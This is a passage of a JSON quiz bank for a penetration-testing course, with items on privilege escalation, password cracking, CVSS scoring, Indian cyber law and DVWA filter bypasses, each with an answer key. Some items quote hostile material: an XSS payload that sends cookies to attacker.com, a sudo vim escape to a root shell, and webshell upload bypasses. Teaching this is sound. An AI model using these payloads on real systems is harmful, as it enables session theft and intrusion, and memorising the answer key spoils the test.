(SAM) database or memory structures (LSASS), which requires SYSTEM or elevated local administrator privileges."}, {"id": 55, "difficulty": "Medium", "unit": "Unit III", "topic": "Linux Privilege Escalation", "question": "In Linux file permissions, how does an SUID (Set User ID) binary behave when executed by an unprivileged user?", "options": ["It runs with the effective privileges of the file owner rather than the caller", "It prompts the executing user to enter the target system's root password three times", "It automatically logs the complete terminal session directly to the /var/log directory", "It runs inside an isolated chroot sandbox that strips all network socket capabilities"], "answer": 0, "explanation": "When the SUID bit (octal 4000) is set on an executable file, any user who runs the binary executes it with the privileges of the file owner (frequently root), creating potential privilege escalation vectors if the binary can be abused."}, {"id": 56, "difficulty": "Medium", "unit": "Unit III", "topic": "Linux Privilege Escalation", "question": "What is the critical security difference between the Linux /etc/passwd and /etc/shadow files?", "options": ["/etc/passwd is world-readable for user info; /etc/shadow stores hashes readable by root", "/etc/passwd is encrypted using AES-GCM; /etc/shadow is stored in plaintext ASCII format", "/etc/passwd sets kernel memory parameters; /etc/shadow defines firewall routing policies", "/etc/passwd stores Kerberos session tickets; /etc/shadow stores SSH public keys for logins"], "answer": 0, "explanation": "Historically, /etc/passwd stored password hashes, but because all programs require access to user IDs, it is world-readable. Hashes were moved to /etc/shadow, which can only be read by root (0400/0640 permissions)."}, {"id": 57, "difficulty": "Medium", "unit": "Unit III", "topic": "Linux Privilege Escalation", "question": "What is the purpose of the GTFOBins project in the context of penetration testing and privilege escalation?", "options": ["A hardware firmware extraction toolkit used for dumping microcontroller flash memory chips", "A curated list of Unix binaries that can be abused to bypass restrictions or escalate", "A commercial vulnerability scanner designed to detect unpatched Apache servers on subnets", "An automated C compiler used to generate polymorphic buffer overflow shellcode for x86"], "answer": 1, "explanation": "GTFOBins is a curated list of Unix binaries (like vim, find, nmap, less, python) that can be abused to bypass local security restrictions, escape restricted shells, or escalate privileges when misconfigured with SUID or sudo."}, {"id": 58, "difficulty": "Medium", "unit": "Unit III", "topic": "Windows Privilege Escalation", "question": "Why does an unquoted service path containing spaces (e.g., C:\\Program Files\\My Service\\service.exe) present an elevation of privilege vulnerability in Windows?", "options": ["The service automatically grants full administrator rights to the anonymous guest user", "Windows resolves unquoted paths at each space, letting attackers hijack execution", "Windows crashes into a kernel panic whenever a service path exceeds sixteen characters", "The Windows registry permanently disables all antivirus protections for unquoted paths"], "answer": 1, "explanation": "Without surrounding quotes, Windows interprets spaces as argument delimiters. It checks for executables in sequence: 'C:\\Program.exe', 'C:\\Program Files\\My.exe', etc. If an attacker has write permissions in any parent folder, they achieve code execution."}, {"id": 59, "difficulty": "Medium", "unit": "Unit III", "topic": "Password Attacks - John the Ripper", "question": "Why is the '--format' flag frequently essential when using John the Ripper to crack password hashes?", "options": ["It reformats the attacker's physical storage drive into an ext4 journaling filesystem", "It converts all uppercase characters in the target password dictionary into lowercase", "It specifies the hash algorithm, preventing incorrect auto-detection and boosting speed", "It instructs the tool to print output directly to an external dot-matrix paper printer"], "answer": 2, "explanation": "Different hash algorithms (e.g., raw-md5, raw-sha256, sha512crypt) have distinct structures and speeds. Explicitly setting '--format=' ensures John loads the correct optimized cracking algorithm rather than guessing."}, {"id": 60, "difficulty": "Medium", "unit": "Unit III", "topic": "Password Attacks - Hashcat", "question": "Why is Hashcat typically preferred over John the Ripper for large-scale dictionary and mask attacks against fast cryptographic hashes like NTLM?", "options": ["Hashcat is the only password tool officially certified by the International Telecom Union", "Hashcat is built for massive parallel processing on Graphics Processing Units (GPUs)", "Hashcat automatically intercepts live WPA3 handshakes without a wireless network card", "Hashcat requires zero computational power by using pre-installed cloud supercomputers"], "answer": 1, "explanation": "Hashcat is designed to leverage GPU acceleration via OpenCL and CUDA, computing billions of hash evaluations per second due to thousands of parallel GPU processing cores, compared to standard CPU execution."}, {"id": 61, "difficulty": "Medium", "unit": "Unit III", "topic": "Password Attacks - Salting", "question": "What is the primary cryptographic purpose of adding a unique cryptographic salt to a password before hashing?", "options": ["It compresses the resulting hash string down to eight characters for faster indexing", "It allows the original plaintext password to be mathematically reversed by administrators", "It makes identical passwords produce unique hashes, defeating precomputed rainbow tables", "It eliminates the need for the user to ever remember or enter their password during login"], "answer": 2, "explanation": "A salt is a random value added to the plaintext password before hashing. Even if two users choose the same password ('password123'), their salts differ, producing unique hashes and preventing attackers from using precomputed rainbow tables."}, {"id": 62, "difficulty": "Medium", "unit": "Unit III", "topic": "Password Attacks - Hydra", "question": "What is the primary operational distinction between Hydra and tools like John the Ripper or Hashcat?", "options": ["Hydra cracks encrypted password hashes offline; John the Ripper only intercepts Wi-Fi", "Hydra requires physical console access to the target server's motherboard BIOS chip", "Hydra can only be executed on Android mobile operating systems using terminal emulators", "Hydra brute-forces live network services online; John and Hashcat crack hashes offline"], "answer": 3, "explanation": "Hydra is an online password-auditing tool that sends live authentication attempts across protocols (SSH, FTP, HTTP, RDP) over the network. John and Hashcat perform offline cracking against extracted hash files on the tester's local hardware."}, {"id": 63, "difficulty": "Medium", "unit": "Unit IV", "topic": "Burp Suite Tools", "question": "What is the primary difference in use case between Burp Suite Repeater and Burp Suite Intruder?", "options": ["Repeater tests for physical cable faults; Intruder tests wireless encryption weaknesses", "Repeater compiles binary exploit code; Intruder decompiles target Java web servlets", "Repeater is exclusively commercial; Intruder is completely open source under GNU GPL", "Repeater is for manual request tweaking; Intruder automates parameterized attacks"], "answer": 3, "explanation": "Burp Repeater allows a tester to manually modify and resend individual HTTP requests to observe server behavior. Burp Intruder automates attacks, sending customized payloads to specified insertion points (e.g., fuzzing, credential stuffing)."}, {"id": 64, "difficulty": "Medium", "unit": "Unit IV", "topic": "Burp Suite Intruder", "question": "In Burp Suite Intruder, which attack type uses a single payload set to test each configured payload position sequentially one after another?", "options": ["Pitchfork", "Cluster Bomb", "Battering Ram", "Sniper"], "answer": 3, "explanation": "Sniper targets one position at a time with a single payload set. Battering Ram places the same payload into all positions simultaneously. Pitchfork uses multiple sets in lockstep, and Cluster Bomb tests every permutation."}, {"id": 65, "difficulty": "Medium", "unit": "Unit V", "topic": "CVSS v3.1 Scoring Metrics", "question": "In the CVSS v3.1 specification, what does the 'Scope (S)' metric evaluate?", "options": ["The total number of billable consulting hours allocated for the penetration test project", "Whether a vulnerability affects resources beyond its security authorization boundary", "Whether the affected organization is legally registered as a public or private company", "The physical geographic distance between the attacking system and the target data center"], "answer": 1, "explanation": "Scope (S: U or C) captures whether a vulnerability in an impacted component affects resources beyond its security boundary (e.g., an XSS flaw in a web app executing in a browser context changes Scope to Changed)."}, {"id": 66, "difficulty": "Medium", "unit": "Unit V", "topic": "CVSS v3.1 Severity Bands", "question": "What are the exact CVSS v3.1 score boundaries for High and Critical qualitative severity ratings?", "options": ["High is 6.0 to 8.0; Critical is 8.1 to 10.0", "High is 5.0 to 7.0; Critical is 7.1 to 10.0", "High is 7.0 to 8.9; Critical is 9.0 to 10.0", "High is 8.0 to 9.5; Critical is 9.6 to 10.0"], "answer": 2, "explanation": "According to the CVSS v3.1 specification: None is 0.0, Low is 0.1–3.9, Medium is 4.0–6.9, High is 7.0–8.9, and Critical is 9.0–10.0."}, {"id": 67, "difficulty": "Medium", "unit": "Unit V", "topic": "VAPT Reporting - Risk Heat Map", "question": "In a VAPT report, what two fundamental dimensions are plotted against each other to construct a Risk Heat Map?", "options": ["Consultant hourly billing rate and total number of discovered endpoints", "Likelihood (probability of exploitation) and Impact (magnitude of business damage)", "Network bandwidth consumption and CPU utilization percentage", "Lines of source code audited and server rack physical temperature"], "answer": 1, "explanation": "A Risk Heat Map visualizes overall risk by plotting Likelihood (how likely a flaw is to be discovered and exploited) on one axis against Impact (the severity of technical or business damage if exploited) on the other."}, {"id": 68, "difficulty": "Medium", "unit": "Unit V", "topic": "Professional Ethics", "question": "What is the key ethical difference between Coordinated (Responsible) Vulnerability Disclosure and Full Disclosure?", "options": ["Coordinated gives vendors time to patch first; Full disclosure publishes immediately", "Coordinated disclosure applies only to open source; Full disclosure applies to hardware", "Coordinated disclosure sells exploits on darknet markets; Full disclosure donates them", "Coordinated disclosure mandates immediate prosecution of the finder by international law"], "answer": 0, "explanation": "Coordinated (responsible) disclosure notifies the vendor privately, giving them a reasonable timeframe (typically 60–90 days) to patch before public release. Full disclosure publishes all details and exploit code immediately without prior vendor coordination."}, {"id": 69, "difficulty": "Medium", "unit": "Unit V", "topic": "Bug Bounty & Ethics", "question": "What critical legal protection do formalized Bug Bounty platforms (e.g., HackerOne, Bugcrowd) provide to ethical security researchers?", "options": ["Exemption from paying all municipal and national income taxes on bounty rewards earned", "Legal safe harbor protecting researchers who follow defined scope from prosecution", "Automatic authorization to attack any public infrastructure operating within borders", "Guaranteed lifetime employment with government cybersecurity intelligence agencies"], "answer": 1, "explanation": "Bug bounty policy briefs define clear 'Safe Harbor' terms: organizations commit not to pursue legal action under anti-hacking laws (like IT Act Sec 43/66) against researchers acting in good faith within the declared scope."}, {"id": 70, "difficulty": "Medium", "unit": "Unit V", "topic": "Certification Pathways", "question": "How does the evaluation format of the Offensive Security Certified Professional (OSCP) differ from the Certified Ethical Hacker (CEH)?", "options": ["OSCP is an entry-level high school quiz; CEH is a ten-year doctorate research dissertation", "OSCP is a 24-hour hands-on practical exam; CEH is primarily a multiple-choice knowledge test", "OSCP evaluates candidates using oral interviews; CEH requires writing an operating system", "OSCP strictly forbids command-line interfaces; CEH requires assembling network switches"], "answer": 1, "explanation": "CEH is traditionally a multiple-choice theoretical exam assessing broad knowledge of tools and concepts. OSCP is an intense 24-hour hands-on exam requiring candidates to compromise target machines and submit a professional pentest report."}, {"id": 71, "difficulty": "Hard", "unit": "Unit V", "topic": "CVSS v3.1 Base Score Calculation", "question": "What is the exact CVSS v3.1 Base Score for the vsftpd 2.3.4 backdoor vulnerability with vector string 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H'?", "options": ["8.8 (High)", "10.0 (Critical)", "9.8 (Critical)", "7.5 (High)"], "answer": 2, "explanation": "With Attack Vector: Network, Attack Complexity: Low, Privileges Required: None, User Interaction: None, Scope: Unchanged, and High Confidentiality, Integrity, and Availability impact, the official CVSS v3.1 calculator yields exactly 9.8 (Critical)."}, {"id": 72, "difficulty": "Hard", "unit": "Unit V", "topic": "CVSS v3.1 Base Score Calculation", "question": "A stored XSS flaw has the vector 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N'. What is its calculated Base Score and why is it lower than an unauthenticated backdoor?", "options": ["6.1 (Medium); it requires User Interaction (UI:R) and has Low impact on C and I", "9.1 (Critical); stored vulnerabilities are permanently embedded inside databases", "4.3 (Medium); Stored XSS can never compromise session cookies or client JavaScript", "8.2 (High); any vulnerability with Scope Changed (S:C) escalates to the High band"], "answer": 0, "explanation": "Even though Scope is Changed (S:C), the requirement for victim interaction (UI:R) and partial impacts (C:L, I:L, A:N) reduce the score to 6.1 (Medium), illustrating how multiple metrics moderate the final score."}, {"id": 73, "difficulty": "Hard", "unit": "Unit II", "topic": "Active Reconnaissance - UDP Scanning", "question": "When performing an Nmap UDP scan (-sU), why are open UDP ports frequently reported in the ambiguous state 'open|filtered'?", "options": ["UDP packets lack checksums, causing the operating system kernel to reject datagrams", "UDP is connectionless; non-responding open ports look identical to filtered probes", "Nmap limits UDP scans to display results only when ICMP Port Unreachable arrives", "The Linux socket API automatically converts all UDP datagrams into encrypted TCP streams"], "answer": 1, "explanation": "If a UDP probe reaches an open port that sends no application response, no packet is returned. If a firewall filters the probe, no packet is returned either. Nmap therefore marks it 'open|filtered'. Only closed ports reply reliably with ICMP Port Unreachable (Type 3, Code 3)."}, {"id": 74, "difficulty": "Hard", "unit": "Unit II", "topic": "Active Reconnaissance - TCP ACK Scan", "question": "What is the primary technical objective of executing an Nmap TCP ACK scan (-sA) against a firewall?", "options": ["To force the remote server to dump its active kernel routing table over TCP sockets", "To exploit a buffer overflow in the target operating system's TCP/IP stack code", "To map firewall rulesets and test statefulness rather than finding open ports", "To establish an interactive command shell on the target without completing the handshake"], "answer": 2, "explanation": "An ACK probe never opens a connection; both open and closed ports return an RST packet if unfiltered. If an RST is returned, the port is 'unfiltered'. If no response or an ICMP error is received, it is 'filtered', allowing testers to map stateless firewall rules."}, {"id": 75, "difficulty": "Hard", "unit": "Unit II", "topic": "DNS Zone Transfer Exploitation", "question": "What is the exact dig command syntax used to attempt an authoritative DNS zone transfer for example.com against nameserver ns1.example.com?", "options": ["dig AXFR example.com @ns1.example.com", "dig IXFR example.com -p 53 /transfer", "dig NS example.com +dump-all @ns1.example.com", "dig -t ZONE example.com --server ns1.example.com"], "answer": 0, "explanation": "The correct dig syntax specifies the AXFR query type followed by the target domain and the target nameserver preceded by '@': 'dig AXFR example.com @ns1.example.com'."}, {"id": 76, "difficulty": "Hard", "unit": "Unit II", "topic": "DNS Security - Zone Transfer Prevention", "question": "What cryptographic mechanism can administrators configure between primary and secondary DNS servers to authenticate and protect zone transfers?", "options": ["Configuring WPA3 enterprise authentication on the DNS server's network interface card", "Enabling HTTPS Basic Authentication within the BIND named.conf configuration file", "Encrypting the hard drive containing the DNS zone files with AES-256 BitLocker", "Transaction Signature (TSIG) using shared secret keys and HMAC to authenticate peers"], "answer": 3, "explanation": "TSIG (RFC 2845) uses shared secret keys and HMAC to authenticate DNS messages and zone transfers between authoritative servers, ensuring transfers are only accepted from authorized peers holding the shared secret."}, {"id": 77, "difficulty": "Hard", "unit": "Unit III", "topic": "Payload Engineering - MSFvenom", "question": "Why is the '-b' flag (e.g., -b '\\x00\\x0a\\x0d') critical when generating shellcode payloads with MSFvenom for memory corruption exploits?", "options": ["It converts 32-bit assembly shellcode into 64-bit ARM machine instructions for mobile", "It strips all debug symbols from the payload to prevent decompilation by Ghidra or IDA", "It automatically compresses the binary executable to fit under email attachment quotas", "It removes bad bytes like nulls that truncate string functions and break shellcode"], "answer": 3, "explanation": "In vulnerabilities exploited via C string functions (e.g., strcpy), characters like \\x00 (null byte), \\x0a (newline), or \\x0d (carriage return) act as string terminators, truncating the shellcode before it executes. The -b flag directs encoders to avoid these bytes."}, {"id": 78, "difficulty": "Hard", "unit": "Unit III", "topic": "Linux Privilege Escalation - SUID", "question": "In the command 'find / -perm -4000 -type f 2>/dev/null', what is the exact function of the '2>/dev/null' segment?", "options": ["It terminates background processes that consume more than four megabytes of virtual RAM", "It redirects stderr (descriptor 2) to /dev/null, hiding 'Permission denied' errors", "It forces the find command to execute with elevated superuser privileges across disks", "It writes the list of discovered root passwords directly to the system kernel buffer"], "answer": 1, "explanation": "When running find across the entire root filesystem as an unprivileged user, numerous 'Permission denied' errors are printed. '2>/dev/null' redirects file descriptor 2 (stderr) to /dev/null, leaving only successful matches on stdout."}, {"id": 79, "difficulty": "Hard", "unit": "Unit III", "topic": "Linux Privilege Escalation - GTFOBins", "question": "If an unprivileged user discovers via 'sudo -l' that they can execute '/usr/bin/vim' as root without a password, how can they immediately obtain a root shell?", "options": ["Rename the vim binary to '/usr/bin/bash' using standard user file move commands", "Run 'sudo vim -c \":!/bin/sh\"' to escape vim directly into an elevated root shell", "Type ':w /etc/shadow' inside vim to corrupt the filesystem journaling storage log", "Press Ctrl+Z to suspend vim and run the unprivileged 'su root' command in terminal"], "answer": 1, "explanation": "Vim supports executing external shell commands via its command-line interface. When run as root via sudo, entering ':!/bin/sh' inside vim immediately spawns a shell inheriting root privileges."}, {"id": 80, "difficulty": "Hard", "unit": "Unit III", "topic": "Password Hash Identification", "question": "A tester extracts the password hash '$6$qZ8y...$K9u...' from a Linux /etc/shadow file. What hashing algorithm does the prefix '$6$' indicate?", "options": ["SHA-256 crypt", "Blowfish (bcrypt)", "MD5 crypt", "SHA-512 crypt"], "answer": 3, "explanation": "In standard Linux crypt format: $1$ is MD5, $2a$ or $2y$ is Blowfish (bcrypt), $5$ is SHA-256, and $6$ is SHA-512. The hash string starts with $6$, identifying it as SHA-512 crypt."}, {"id": 81, "difficulty": "Hard", "unit": "Unit III", "topic": "Windows Privilege Escalation", "question": "Which Windows user privilege is exploited by 'Potato' privilege escalation tools (e.g., RottenPotato, PrintSpoofer) to impersonate NT AUTHORITY\\SYSTEM?", "options": ["SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege", "SeChangeNotifyPrivilege or SeUndockPrivilege", "SeShutdownPrivilege or SeSecurityPrivilege", "SeRemoteShutdownPrivilege or SeSyncAgentPrivilege"], "answer": 0, "explanation": "Service accounts (such as IIS or SQL Server service accounts) often hold SeImpersonatePrivilege. 'Potato' exploits abuse this privilege by tricking a SYSTEM service to authenticate to a local rogue named pipe and stealing its token."}, {"id": 82, "difficulty": "Hard", "unit": "Unit IV", "topic": "DVWA SQL Injection - Medium Security Bypass", "question": "In DVWA at Medium security, the SQL injection parameter is an integer submitted via HTTP POST with magic quotes / escaping active. Why does this defense fail?", "options": ["HTTP POST requests bypass the database engine and write directly to web server memory", "The backend MySQL server automatically decrypts single quotes before executing queries", "Numeric SQL parameters require no quotes, letting attackers inject syntax directly", "Magic quotes automatically converts all injected SQL keywords into assembly shellcode"], "answer": 2, "explanation": "In DVWA Medium, the query is structured as 'SELECT ... WHERE id = ' . $_POST['id']. Because the input is treated as an integer, no quotes enclose the variable in the SQL query. An attacker can inject '1 UNION SELECT ...' without any quotes."}, {"id": 83, "difficulty": "Hard", "unit": "Unit IV", "topic": "SQL Injection - UNION Queries", "question": "When constructing a UNION-based SQL injection attack, why do testers initially populate select columns with 'NULL' (e.g., UNION SELECT NULL, NULL)?", "options": ["NULL forces the database to return records in reverse alphabetical sorting order", "NULL is compatible with almost every column type, preventing data type mismatches", "NULL automatically grants administrative root privileges to the connection pool", "NULL instructs the database to delete all existing table rows before returning data"], "answer": 1, "explanation": "In SQL, every column in a UNION query must have a data type compatible with the corresponding column in the original query. Using NULL satisfies almost any column type (integer, string, date), preventing conversion errors."}, {"id": 84, "difficulty": "Hard", "unit": "Unit IV", "topic": "DVWA XSS - Filter Bypass", "question": "If a PHP web application uses a single-pass string replacement function '$input = str_replace('<script>', '', $input);', how can an attacker bypass it?", "options": ["Replace all whitespace characters in the HTML document with ASCII carriage returns", "Set the HTTP request Content-Length header to zero before transmitting the packet", "Encode the script entirely in Base32 formatting within the HTTP user-agent header", "Use case variation (e.g., '<sCRIpt>') or nested tags (e.g., '<scr<script>ipt>')"], "answer": 3, "explanation": "str_replace is case-sensitive, so '<sCRIpt>' bypasses it entirely. Furthermore, because it executes only once without recursion, '<scr<script>ipt>' has its inner '<script>' removed, leaving the outer '<script>' intact."}, {"id": 85, "difficulty": "Hard", "unit": "Unit IV", "topic": "DVWA File Upload - Medium Security Bypass", "question": "In DVWA File Upload at Medium security, the server checks the client-provided HTTP 'Content-Type' header. How does a tester bypass this check using Burp Suite?", "options": ["Change the HTTP request method from POST to GET and send the payload in query strings", "Intercept upload in Burp and change Content-Type from 'application/x-php' to 'image/jpeg'", "Encrypt the uploaded PHP webshell file using a 4096-bit RSA asymmetric public key", "Modify the Host header to point directly to an authoritative external DNS nameserver"], "answer": 1, "explanation": "The server naively inspects the client-controlled 'Content-Type' HTTP header instead of verifying the file on disk. Intercepting the request in Burp and changing the Content-Type to 'image/jpeg' or 'image/png' bypasses the validation."}, {"id": 86, "difficulty": "Hard", "unit": "Unit IV", "topic": "DVWA File Upload - High Security Bypass", "question": "When a web application validates file uploads using PHP's 'getimagesize()' function, what technique can an attacker use to bypass the filter?", "options": ["Transmit the raw PHP code inside an ICMP Echo Request packet directed at port 80", "Strip all metadata from the PHP file using the Linux exiv2 command-line utility", "Rename the file extension to .exe and upload it via an unauthenticated FTP session", "Prepend image magic bytes (e.g., GIF89a;) to the PHP webshell to create a polyglot"], "answer": 3, "explanation": "getimagesize() inspects the beginning of the file for valid graphic file headers (magic bytes). Prepending 'GIF89a;' to a PHP file tricks the function into recognizing the file as a valid GIF image."}, {"id": 87, "difficulty": "Hard", "unit": "Unit IV", "topic": "CSRF vs SSRF", "question": "What is the fundamental architectural difference between Cross-Site Request Forgery (CSRF) and Server-Side Request Forgery (SSRF)?", "options": ["CSRF requires root access on the target server; SSRF requires an active X.509 certificate", "CSRF only works over unencrypted HTTP; SSRF is restricted strictly to DNS lookups", "CSRF forces the victim browser to send requests; SSRF forces the backend server to send them", "CSRF targets database relational tables; SSRF targets physical ethernet cable runs"], "answer": 2, "explanation": "In CSRF, the attacker induces a victim's web browser to execute unwanted actions on a web application where they are currently authenticated. In SSRF, the attacker abuses server functionality to make the backend server itself forge requests."}, {"id": 88, "difficulty": "Hard", "unit": "Unit III", "topic": "Post-Exploitation - Local Exploit Suggester", "question": "How does the Metasploit post module 'post/multi/recon/local_exploit_suggester' identify viable privilege escalation vectors on a compromised target?", "options": ["It matches target OS, kernel, and missing patches against Metasploit local exploits", "It intercepts all incoming network packets using raw promiscuous mode socket drivers", "It conducts an online brute-force dictionary attack against all local user accounts", "It reboots the target machine into an emergency hardware BIOS diagnostic environment"], "answer": 0, "explanation": "local_exploit_suggester analyzes system architecture, kernel release, and installed security patches, cross-referencing them against Metasploit's local exploit module requirements to output a ranked list of viable privilege escalation exploits."}, {"id": 89, "difficulty": "Hard", "unit": "Unit IV", "topic": "SQL Injection Defense - Parameterization", "question": "Why do Parameterized Queries (Prepared Statements) provide complete, robust defense against SQL Injection vulnerabilities?", "options": ["Parameterized queries automatically encode incoming user strings into RSA ciphertext", "Parameterized queries convert relational MySQL database tables into flat CSV text files", "The SQL query structure is compiled first; input is bound purely as literal data", "Parameterized queries reject any input containing alphanumeric English characters"], "answer": 2, "explanation": "Prepared statements pre-compile the SQL code template on the database server. When parameter values are subsequently sent, the database treats them strictly as data values, preventing user input from ever breaking out into executable syntax."}, {"id": 90, "difficulty": "Hard", "unit": "Unit II", "topic": "Vulnerability Assessment - False Positives", "question": "Why do automated vulnerability scanners (like Nessus Essentials) frequently report false positives on Linux systems running Apache or OpenSSH?", "options": ["Scanners rely on version banners, missing patches backported by Linux distributions", "Scanners deliberately report false positives to force clients to purchase licenses", "The Nessus scanning engine is incapable of processing TCP packets across local switches", "Linux operating systems falsify all port numbers whenever an automated probe is seen"], "answer": 0, "explanation": "Distributions like Debian and Red Hat regularly backport security patches into older upstream version releases without changing the version string (e.g., OpenSSH 4.7p1-Debian-8ubuntu1.2). A banner-based scanner sees '4.7p1' and flags it as vulnerable even if patched."}, {"id": 91, "difficulty": "Hard", "unit": "Unit V", "topic": "Vulnerability Triaging", "question": "A VAPT discovers an internal CVSS 9.8 flaw on an isolated air-gapped server and a CVSS 7.8 flaw on a public-facing web server. Why might the 7.8 flaw take priority?", "options": ["CVSS rules mandate that vulnerabilities scored between 7.0 and 8.0 take precedence", "Automated vulnerability scanners produce invalid CVSS calculations above 9.0", "The 7.8 flaw is externally exposed to the Internet; the internal 9.8 flaw lacks reachability", "Air-gapped servers are legally exempt from all cybersecurity compliance standards"], "answer": 2, "explanation": "True remediation priority must combine CVSS Base Score with asset exposure, threat reachability, and business impact. An internet-facing asset with an actively exploitable High vulnerability poses immediate actual risk compared to an unreachable internal Critical issue."}, {"id": 92, "difficulty": "Hard", "unit": "Unit I", "topic": "IT Act 2000 - Legal Specifics", "question": "In cyber jurisprudence under the Indian IT Act 2000, what is the precise legal distinction between Section 43 and Section 66?", "options": ["Section 43 governs wireless networking; Section 66 governs optical fiber communications", "Section 43 requires mandatory life imprisonment; Section 66 only requires an apology", "Section 43 handles civil damages; Section 66 establishes criminal liability requiring mens rea", "Section 43 applies only to foreign nationals; Section 66 applies exclusively to citizens"], "answer": 2, "explanation": "Section 43 provides civil remedies (monetary compensation for damages caused without authorization). Section 66 turns the exact same acts into criminal offences (punishable with imprisonment up to 3 years and fines) if done 'dishonestly or fraudulently'."}, {"id": 93, "difficulty": "Hard", "unit": "Unit I", "topic": "Regulatory Framework - DPDP Act 2023", "question": "Under the Digital Personal Data Protection (DPDP) Act 2023, what is the maximum financial penalty that can be imposed for failure to prevent a personal data breach?", "options": ["Strictly capped at ₹25 crore", "Up to ₹250 crore", "Up to ₹50 lakh", "Up to ₹5 crore"], "answer": 1, "explanation": "The DPDP Act 2023 establishes substantial financial penalties: for failure of a Data Fiduciary to take reasonable security safeguards to prevent a personal data breach, the Data Protection Board can levy penalties up to ₹250 crore."}, {"id": 94, "difficulty": "Hard", "unit": "Unit I", "topic": "Regulatory Framework - CERT-In Directions 2022", "question": "Under the CERT-In Cyber Security Directions (April 2022), within what timeframe must mandatory cybersecurity incidents be reported to CERT-In?", "options": ["Within 30 calendar days following the quarterly fiscal audit", "Within 24 hours only if financial damages exceed one crore rupees", "Within 72 hours of complete forensic investigation completion", "Within 6 hours of noticing or being brought to notice of the incident"], "answer": 3, "explanation": "The CERT-In Directions issued on April 28, 2022, mandate that all covered entities, intermediaries, and service providers must report specified cybersecurity incidents to CERT-In within 6 hours of discovery."}, {"id": 95, "difficulty": "Hard", "unit": "Unit II", "topic": "OSINT Tools - Maltego", "question": "What is the core operational concept of 'Transforms' within Maltego Community Edition during reconnaissance?", "options": ["Cryptographic functions that convert MD5 hashes directly into plaintext passwords", "Network kernel drivers that re-route raw Ethernet frames through distributed proxies", "Automated queries that query APIs to discover and plot relationships between entities", "Compilers that translate Python scripts into obfuscated x86 assembly language payloads"], "answer": 2, "explanation": "In Maltego, 'Transforms' are automated routines that take an input entity (such as a Domain, Person, or IP) and query external data sources to return associated entities (such as DNS records, emails, or netblocks) as connected nodes on a graph."}, {"id": 96, "difficulty": "Hard", "unit": "Unit II", "topic": "Active Reconnaissance - Banner Grabbing", "question": "An ethical hacker captures the banner 'SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1.2'. What specific OS and distribution details are revealed?", "options": ["A Cisco Catalyst switch running proprietary IOS version 12.2 enterprise firmware", "An Apple macOS workstation running an unpatched BSD Unix kernel service", "A Microsoft Windows Server 2019 system operating an OpenSSH emulation layer", "OpenSSH 4.7p1 running on Ubuntu Linux (derived from Debian packaging)"], "answer": 3, "explanation": "Banner grabbing exposes precise OS distribution metadata: 'Debian-8ubuntu1.2' reveals that the target system is Ubuntu Linux (a Debian derivative), giving the tester specific distro targets for exploit research."}, {"id": 97, "difficulty": "Hard", "unit": "Unit III", "topic": "Password Attacks - Hashcat Modes", "question": "Why does Hashcat crack NTLM hashes (-m 1000) millions of times faster than Linux sha512crypt hashes (-m 1800) on identical hardware?", "options": ["NTLM hashes are stored in cleartext ASCII; sha512crypt uses quantum cryptography", "NTLM is a single unsalted MD4 hash; sha512crypt performs 5,000 salted SHA-512 rounds", "Hashcat uses cloud supercomputers for NTLM but restricts sha512crypt to single CPUs", "Linux sha512crypt hashes block GPU processing by executing recursive kernel interrupts"], "answer": 1, "explanation": "NTLM is computationally trivial (a single round of MD4 without salt). sha512crypt (standard in Linux /etc/shadow) is specifically designed to be slow, applying 5,000 rounds of salted SHA-512 to intentionally increase brute-force computation time."}, {"id": 98, "difficulty": "Hard", "unit": "Unit IV", "topic": "Web Application Security - XSS Cookie Extraction", "question": "In an XSS demonstration, an attacker uses '<script>new Image().src=\"http://attacker.com/log?c=\"+document.cookie;<\/script>'. When will this payload FAIL to exfiltrate session tokens?", "options": ["When the session cookie is marked with the 'HttpOnly' flag attribute", "When the client workstation is connected to the Internet via an Ethernet cable", "When the target web server uses TLS/HTTPS encryption on incoming connections", "When the user views the website using a 64-bit operating system"], "answer": 0, "explanation": "The 'HttpOnly' flag specifically instructs web browsers that the cookie must not be exposed to client-side scripts. When present, 'document.cookie' returns an empty string or omits the session token, thwarting the exfiltration attempt."}, {"id": 99, "difficulty": "Hard", "unit": "Unit II", "topic": "Active Reconnaissance - NSE Scripts", "question": "What is the critical operational danger of executing Nmap with '--script=vuln' against a sensitive enterprise production system?", "options": ["The 'vuln' scripts include intrusive checks and DoS probes that can crash production services", "It automatically notifies international law enforcement agencies by transmitting logs", "It deletes all active user accounts from the target operating system's database directory", "It permanently corrupts the BIOS firmware of the network router connecting the subnets"], "answer": 0, "explanation": "NSE scripts in the 'vuln' and 'dos' categories actively probe for vulnerabilities and may send malformed packets that can crash fragile, unpatched, or legacy production services, violating the RoE and causing unauthorized downtime."}, {"id": 100, "difficulty": "Hard", "unit": "Unit I", "topic": "Testing Standards - PTES", "question": "What is the correct sequential order of the seven phases defined in the Penetration Testing Execution Standard (PTES)?", "options": ["Intelligence Gathering, Threat Modeling, Pre-engagement Interactions, Exploitation, Post Exploitation, Vulnerability Analysis, Reporting", "Pre-engagement Interactions, Intelligence Gathering, Threat Modeling, Vulnerability Analysis, Exploitation, Post Exploitation, Reporting", "Pre-engagement Interactions, Exploitation, Threat Modeling, Intelligence Gathering, Post Exploitation, Vulnerability Analysis, Reporting", "Threat Modeling, Pre-engagement Interactions, Intelligence Gathering, Exploitation, Vulnerability Analysis, Reporting, Post Exploitation"], "answer": 1, "explanation": "The 7 PTES phases are: 1. Pre-engagement Interactions, 2. Intelligence Gathering, 3. Threat Modeling, 4. Vulnerability Analysis, 5. Exploitation, 6. Post Exploitation, 7. Reporting."}, {"id": 101, "difficulty": "Scenario", "unit": "Unit I", "topic": "Rules of Engagement & Scope", "question": "During a black-box penetration test for a bank, a tester identifies an active subnet (192.168.100.0/24) containing unpatched servers that was not listed in the signed RoE scope document. What is the tester's correct immediate course of action?", "options": ["Halt scanning on that subnet and request written scope clarification from the client", "Compromise the domain controller immediately and document the subnet in the appendix", "Proceed with full exploitation since the subnet resides in the client's data center", "Report the subnet anonymously to CERT-In as an unauthorized network breach incident"], "answer": 0, "explanation": "Testing systems outside the agreed scope constitutes unauthorized access under Section 43/66 of the IT Act 2000. Testers must pause testing on unknown subnets and obtain explicit written authorization before continuing."}, {"id": 102, "difficulty": "Scenario", "unit": "Unit II", "topic": "Passive OSINT - Public Repositories", "question": "While conducting passive OSINT on a client organization, an ethical hacker discovers an open 